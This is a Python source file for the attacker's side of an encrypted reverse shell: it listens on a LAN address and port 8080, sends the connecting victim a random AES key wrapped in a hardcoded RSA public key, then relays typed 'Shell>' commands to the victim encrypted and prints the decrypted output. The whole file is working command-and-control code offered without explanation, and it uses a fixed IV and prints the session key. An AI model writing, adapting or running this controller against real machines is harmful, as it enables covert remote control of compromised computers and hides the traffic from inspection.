import socket
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP
from Cryptodome.Cipher import AES
from Cryptodome.Util import Padding
import string
import random

IV = b"H" * 16


key = ''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits + '^!\$%&/()=?{[]}+~#-_.:,;<>|\\') for _ in range(0, 32))


def SEND_AES(message):
    publickey = '''-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAt9mjsBED9D/MYnU+W5+6
aP9SS1vgL9X6bThNkGKsZ5ZVfnoK4BxMBHI5Gi/YtoCJjyAGsWMpxy1fQ+F+ZWVA
kwZDoQMWTrfZASHmQgB944PfGA7qfn15kDXmCyvzbitRyWvTs1LDDNF7Q/54Qj82
h/85ibOPzQrpwQTjEAs8CJ14YWXAJnqOC6devaDYKdB7SSlueVtoQ8BxWc3hOJHJ
pvgZQ/6NixnICLIrFN0YbKZo4A0D3yRJIdumZw8uqwEMeIt41ja6zOG3gKtsG8su
BZ/MvqX0WgojWr6hNs1Q8h3LtiSsPiUP/bTWD9zos8Yr7RuEabesjHlY0qcNzZ/Y
gKXdgxUkCikTjRon6Mvh7iWKAtEilQlDeBYMGUvFUQ5FMF5LZJ5Q/7+JXulv8Whq
KTp4dGpB3kUWuN+ltxBr+IYPhpBfMcR97W+NuXDReUiIGFJpVI1m4AeCzz1BdAM7
U928DcglK6IowMmN4McyKuv49YYPd7TNFjJWc7P6e19V3BsxA5jpCc6Dxp5AM6WC
0FqgSSOGVCIkcHT5wLcALyaXOaO0vhMgWWO233Of33wh/7oHclsc5r44MHlZrNSe
X2QIHCFU4Mwp1hutIuIKkn5dLt1qmt2CDUO/uxGbdTf667c9TLYcYWoi/eDBdrVx
7CkYI7g81RdcB6jGgbr9W4kCAwEAAQ==
-----END PUBLIC KEY-----'''
    public_key = RSA.importKey(publickey)
    encryptor = PKCS1_OAEP.new(public_key)
    encryptedData = encryptor.encrypt(message)
    return encryptedData




def encrypt(message):
    encryptor = AES.new(key.encode(), AES.MODE_CBC, IV)
    padded_message = Padding.pad(message, 16)
    encrypted_message = encryptor.encrypt(padded_message)
    return encrypted_message

def decrypt(cipher):
    decryptor = AES.new(key.encode(), AES.MODE_CBC, IV)
    decrypted_padded_message = decryptor.decrypt(cipher)
    decrypted_message = Padding.unpad(decrypted_padded_message,
                                      16)
    return decrypted_message


def connect():
    s = socket.socket()
    s.bind(('192.168.0.152', 8080))
    s.listen(1)
    print('[+] Listening for incoming TCP connection on port 8080')
    
    conn, addr = s.accept()
    print(key.encode())
    conn.send(SEND_AES(key.encode()))

    while True:
        store = ''
        command = input("Shell> ")
        if 'terminate' in command:
            conn.send('terminate'.encode())
            conn.close()
            break
        else:
            command = encrypt(command.encode())
            conn.send(command)
            result = conn.recv(1024)
            try:
                print(decrypt(result).decode())
            except:
                print("[-] unable to decrypt/receive data!")

connect()

